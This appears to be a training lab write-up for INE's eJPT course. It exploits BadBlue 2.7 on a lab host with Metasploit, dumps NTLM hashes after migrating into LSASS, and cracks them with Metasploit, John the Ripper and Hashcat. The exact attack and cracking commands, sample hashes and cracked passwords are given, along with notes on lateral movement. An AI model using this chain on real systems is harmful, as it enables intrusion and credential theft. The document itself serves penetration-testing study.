# Windows NTLM Hash Cracking - INE eJPT

INE credential access lab covering the full workflow from initial access to NTLM hash extraction and cracking using three tools: Metasploit's built-in cracker, John the Ripper, and Hashcat. Target is a Windows machine running BadBlue 2.7.

Target: `demo.ine.local` (Windows - BadBlue 2.7 on port 80)

---

## Enumeration

```bash
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

Port 80 - BadBlue 2.7.

---

## Initial Access

```bash
searchsploit badblue 2.7
/etc/init.d/postgresql start
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

Meterpreter session obtained.

---

## Hash Extraction

### Migrate to LSASS

```bash
migrate -N lsass.exe
```

Running from the LSASS process context allows reading credential material from memory.

### Dump NTLM Hashes

```bash
hashdump
```

NTLM hashes for all local accounts extracted. Background the session and verify the loot:

```bash
background
creds
```

Hashes are stored in the Metasploit workspace database.

---

## Hash Cracking

### Method 1 - Metasploit analyze module

```bash
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

Results:

```
Administrator : password
bob           : password1
```

### Method 2 - John the Ripper

Save hashes to a file:

```
Administrator:b4b9b02e6f09a9bd760f388b67351e2b
bob:58a478135a93ac3bf058a5ea0e8fdb71
```

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hashes.txt
john --show --format=NT ntlm_hashes.txt
```

Incremental mode (no wordlist):

```bash
john --incremental --format=NT ntlm_hashes.txt
```

Verify supported formats:

```bash
john --list=formats | grep -i nt
```

### Method 3 - Hashcat

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

With rules:

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

Mask attack (brute force all 8-character combinations):

```bash
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a
```

Show results:

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

NTLM mode number for Hashcat is `1000`.

---

## Key Takeaways

- `migrate -N lsass.exe` before `hashdump` is required on modern Windows versions. Running `hashdump` from the initial exploit process context may fail or return incomplete results.
- Metasploit `analyze/crack_windows` integrates directly with the workspace credential store - no file export needed. Use it for quick wins during an engagement before switching to dedicated tools.
- John uses `--format=NT` for NTLM hashes. Hashcat uses `-m 1000`. These are frequently confused - verify the format before running.
- Cracked plaintext passwords enable lateral movement against other services (RDP, WinRM, SMB) where the hash alone may not authenticate directly.
- The cracking tool hierarchy: Metasploit (`analyze/crack_windows`) for integrated workflow, John for versatile offline cracking, Hashcat for GPU acceleration and large-scale attacks with rules and masks.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
